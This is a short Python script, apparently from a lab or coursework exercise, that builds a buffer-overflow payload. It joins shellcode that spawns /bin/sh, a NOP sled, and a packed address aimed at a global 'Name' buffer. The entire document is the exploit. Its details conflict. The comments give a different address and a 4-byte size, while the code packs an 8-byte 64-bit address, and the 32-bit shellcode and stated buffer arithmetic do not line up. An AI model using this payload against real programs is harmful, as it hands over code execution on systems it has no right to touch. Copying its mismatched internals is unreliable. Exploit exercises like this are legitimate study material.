#!/usr/bin/python3

import struct

name_addr = struct.pack("Q", 0x555555558040)
#use gdb to find the address name. 0x80dacc0 is the address of global variable Name, 4 bytes
shellcode = bytes([0x31,0xc0, 0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80])
#the shellcode I found online, 25 bytes

nop = b"\x90" * 23
# Ensure the total size is 32 bytes

#no operation is 23 bytes
#25 + 23 + 4 = Name buffer
# Combine the elements into an exploit payload
exploit_payload = shellcode + nop + name_addr

print(exploit_payload)
